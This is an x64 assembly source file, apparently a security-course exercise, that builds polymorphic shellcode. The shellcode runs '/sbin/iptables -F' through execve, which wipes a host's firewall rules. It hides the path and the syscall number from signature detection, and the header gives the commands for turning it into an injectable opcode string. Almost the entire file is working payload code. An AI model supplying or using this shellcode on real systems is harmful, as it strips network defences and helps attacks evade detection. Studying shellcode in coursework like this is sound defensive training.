; Filename:      shellcode-polymorphic-asm.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  09.02.2019
; Note:          x64
; Assembler:     nasm -f elf64 shellcode-polymorphic-asm.nasm -o shellcode-polymorphic-asm.o
; Linker:        ld -m elf_x86_64 shellcode-polymorphic-asm.o -o shellcode-polymorphic-asm
; Assembly dump: objdump -d ./shellcode-polymorphic-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

_start:

	;int execve(const char *filename, char *const argv[], char *const envp[])
	xor rax,rax                    ; Clear eax register
	push rax                       ; Push null to stack
	push word 0x462d               ; Push "F-"
	mov rcx,rsp                    ; Save stack pointer in rcx
	mov rbx,0x73656c626174ffff     ; Set valut in rbx
	shr rbx,byte 0x10              ; Shift right by 16
	push rbx                       ; Push 0x000073656C626174 "selbat"
	mov rbx,0x70692f2f2f2f2f2f     ; "pi//////"
	push rbx                       ; Push string to th stack
	mov rbx,0x2f2f2f6e6962732f     ; "///nibs/"
	push rbx                       ; Push string to th stack
	mov rdi,rsp                    ; Save stack pointer in rdi *filename
	push rax                       ; Push null to stack
	push rcx                       ; Push address *parameter
	push rdi                       ; Push address *filename
	mov rsi,rsp                    ; Save stack pointer in rsi *argv

	xor rcx, rcx                   ; Clear rcx register
	mov cl, 0x3b                   ; Set loop counter
	repeat:
	  inc rax                      ; Increment rax till 0x3b sys_execve
	  loop repeat
	xor rdx, rdx
	syscall
